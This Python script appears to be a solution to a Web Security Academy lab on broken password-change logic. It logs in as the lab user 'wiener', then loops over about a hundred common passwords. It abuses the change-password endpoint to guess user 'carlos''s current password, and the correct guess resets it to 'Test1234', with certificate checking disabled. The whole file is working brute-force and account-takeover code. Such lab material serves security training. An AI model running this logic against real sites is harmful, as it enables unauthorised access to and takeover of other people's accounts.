import re
import ssl
import urllib.parse
import http.client

LAB_ID = "???"


def POST_login() -> http.client.HTTPResponse:
    method, path = 'POST', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/login',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    fields = {
        'username': 'wiener',
        'password': 'peter',
    }
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def POST_myaccount_changepassword(
        session: str,
        old_password: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/my-account/change-password'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/my-account?id=wiener',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    fields = {
        'username': 'carlos',
        'current-password': old_password,
        'new-password-1': 'Test1234',
        'new-password-2': 'Test1234',
    }
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def login_session() -> str:
    response = POST_login()
    if response.status != 302:
        print(response.status)
        print(response.headers)
        print(response.read())
        raise Exception("Could not login")
    cookie_header = response.getheader('set-cookie')
    return re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]


def is_password_valid(session, password):
    response = POST_myaccount_changepassword(session, password)
    return response.status == 200


passwords = ['123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon',
             '123123', 'baseball', 'abc123', 'football', 'monkey', 'letmein', 'shadow', 'master', '666666',
             'qwertyuiop', '123321', 'mustang', '1234567890', 'michael', '654321', 'superman', '1qaz2wsx', '7777777',
             '121212', '000000', 'qazwsx', '123qwe', 'killer', 'trustno1', 'jordan', 'jennifer', 'zxcvbnm', 'asdfgh',
             'hunter', 'buster', 'soccer', 'harley', 'batman', 'andrew', 'tigger', 'sunshine', 'iloveyou', '2000',
             'charlie', 'robert', 'thomas', 'hockey', 'ranger', 'daniel', 'starwars', 'klaster', '112233', 'george',
             'computer', 'michelle', 'jessica', 'pepper', '1111', 'zxcvbn', '555555', '11111111', '131313', 'freedom',
             '777777', 'pass', 'maggie', '159753', 'aaaaaa', 'ginger', 'princess', 'joshua', 'cheese', 'amanda',
             'summer', 'love', 'ashley', 'nicole', 'chelsea', 'biteme', 'matthew', 'access', 'yankees', '987654321',
             'dallas', 'austin', 'thunder', 'taylor', 'matrix', 'mobilemail', 'mom', 'monitor', 'monitoring', 'montana',
             'moon', 'moscow']

for password in passwords:
    session = login_session()
    print(f"trying carlos:{password}")
    if is_password_valid(session, password):
        print(f"found password: {password}")
        print("current password: Test1234")
        break
else:
    print("couldn't find password")
